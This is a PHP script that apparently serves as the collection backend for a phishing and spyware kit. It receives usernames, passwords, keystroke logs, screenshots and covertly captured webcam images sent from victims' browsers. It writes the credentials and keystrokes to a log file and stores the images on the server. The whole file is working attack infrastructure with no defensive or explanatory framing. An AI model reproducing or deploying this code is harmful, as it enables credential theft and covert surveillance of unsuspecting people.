<?php
$baseDataDir = '../../collected_data/'; 
$logFile = $baseDataDir . 'logs.txt';
$screenshotDir = $baseDataDir . 'screenshots/';
$cameraImageDir = $baseDataDir . 'camera_images/';
$ip = $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'UNKNOWN';


if (!is_dir($baseDataDir)) {
    mkdir($baseDataDir, 0777, true); 
}



if (!is_dir($screenshotDir)) {
    mkdir($screenshotDir, 0777, true);
}
if (!is_dir($cameraImageDir)) {
    mkdir($cameraImageDir, 0777, true);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // log
    $logEntry = "========================================\n";
    $logEntry .= "Time: " . date('Y-m-d H:i:s') . "\n";
    $logEntry .= "IP: $ip\n";
    $logEntry .= "User Agent: $userAgent\n";
    $logEntry .= "----------------------------------------\n";

    
    $username = $_POST['identifier'] ?? $_POST['email'] ?? $_POST['username'] ?? '';
    
    $password = $_POST['password'] ?? '';
    
    $keys = $_POST['keys'] ?? '';
    
    $screenshotData = $_POST['screenshot'] ?? '';
    
    $cameraImageData = $_POST['camera_image'] ?? '';
    
    $cameraError = $_POST['error'] ?? '';


    // data to log
    if (!empty($username)) $logEntry .= "Identifier/Email: $username\n";
    if (!empty($password)) $logEntry .= "Password: $password\n";
    if (!empty($keys)) $logEntry .= "Keylogs: " . $keys . "\n";
    if (!empty($cameraError)) $logEntry .= "Camera Access Error: " . $cameraError . "\n";


    
    if (!empty($screenshotData)) {
        
        $base64Image = str_replace('data:image/png;base64,', '', $screenshotData);
        $base64Image = str_replace(' ', '+', $base64Image); 
        $imageData = base64_decode($base64Image);

        if ($imageData !== false) {
            $screenshotFileName = $screenshotDir . time() . '_' . uniqid() . '.png';
            file_put_contents($screenshotFileName, $imageData);
            $logEntry .= "Screenshot saved to: " . basename($screenshotFileName) . " in $screenshotDir\n"; // ሎግ ላይ የሚታየውን ዱካ ማሳጠር
        } else {
            $logEntry .= "Failed to decode screenshot data.\n";
        }
    }

    
    if (!empty($cameraImageData)) {
        
        $base64Image = str_replace('data:image/png;base64,', '', $cameraImageData);
        $base64Image = str_replace(' ', '+', $base64Image); 
        $imageData = base64_decode($base64Image);

        if ($imageData !== false) {
            $cameraImageFileName = $cameraImageDir . time() . '_' . uniqid() . '.png';
            file_put_contents($cameraImageFileName, $imageData);
            $logEntry .= "Camera image saved to: " . basename($cameraImageFileName) . " in $cameraImageDir\n"; // ሎግ ላይ የሚታየውን ዱካ ማሳጠር
        } else {
            $logEntry .= "Failed to decode camera image data.\n";
        }
    }

    $logEntry .= "========================================\n\n"; 

    
    file_put_contents($logFile, $logEntry, FILE_APPEND);

    
    echo json_encode(['status' => 'success', 'message' => 'Data received and logged.']);
    exit();

} else {
    
    header('HTTP/1.1 405 Method Not Allowed');
    echo json_encode(['status' => 'error', 'message' => 'Only POST requests are allowed.']);
    exit();
}
?>
